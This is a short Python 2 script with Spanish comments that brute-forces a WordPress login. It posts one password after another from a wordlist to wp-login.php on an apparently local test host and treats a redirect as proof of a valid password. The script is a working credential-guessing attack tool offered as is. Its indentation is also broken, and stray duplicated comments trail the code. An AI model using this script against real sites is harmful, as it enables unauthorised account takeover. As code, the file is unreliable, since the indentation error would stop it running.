#!/usr/bin/python
# Importamos los modulos necesarios.
import requests
# Abrimos el diccionario.
dictionary = open("password.txt","r")
# Leemos cada palabra del diccionario una a una.
for word in dictionary.readlines():
 #creamos una variable con los datos del POST
    data = {
        'log':'wordpress',
        'pwd':word.strip("\n")  
    }
    # Realizamos una peticion POST con los datos de wordpress.
    r = requests.post("http://wordpress.local/wp-login.php", data=data, allow_redirects=False)
     # Comprobamos si el resultado de la conexion nos devuelve un codigo 301 o 302.
    # Si el resultado es uno de estos dos codigos, la pass sera la correcta.
   if r.status_code in [301,302]:
        print "Las credenciales: wordpress : %s son validas" %(word.strip("\n"))
        break
    else:
        print "Las credenciales: wordpress : %s son invalidas" %(word.strip("\n"))
#Lo primero será importar el módulo request, que como ya hemos mencionado antes, nos permite interactuar con aplicaciones web.
# Importamos los modulos necesarios.
